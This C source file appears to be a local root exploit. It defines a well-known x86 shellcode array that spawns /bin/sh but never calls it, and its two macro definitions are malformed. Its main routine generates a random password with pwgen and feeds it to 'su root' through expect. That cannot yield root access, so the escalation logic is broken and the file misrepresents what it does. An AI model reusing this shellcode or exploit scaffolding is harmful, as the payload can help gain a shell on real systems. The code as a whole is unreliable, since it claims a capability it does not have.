#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#define EXPLOIT_COMMANDS = "expect -c 'spawn su root; expect \"Password:\"; send \"%s\\r\"; interact'"
#define COMMAND_STRING = "test"
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
#define MAX_BUFFER_SIZE 1024

int main(void) {
    char buffer[9];
    int i;
    char command[MAX_BUFFER_SIZE];
    char j;
    char check;
    FILE *tmp_file;

//set env variable
    setenv("HOME", "/root", 1);
    
    // pwgen, save the pw pw.txt
    system("pwgen -w > p.txt");

    //tmp file stores opened file
    tmp_file = fopen("p.txt", "r");

    // load pw pw.txt file
    for ( j = fgetc( tmp_file ); j != ':'; j = fgetc( tmp_file) );

    j = fgetc( tmp_file );
    for (i = 0; i < 8; buffer[i++] = fgetc( tmp_file ) );
    buffer[8] = '\0';
    sprintf(command, "expect -c 'spawn su root; expect \"Password:\"; send \"%s\\r\"; interact'", buffer);
    fclose(tmp_file);
    system(command);

}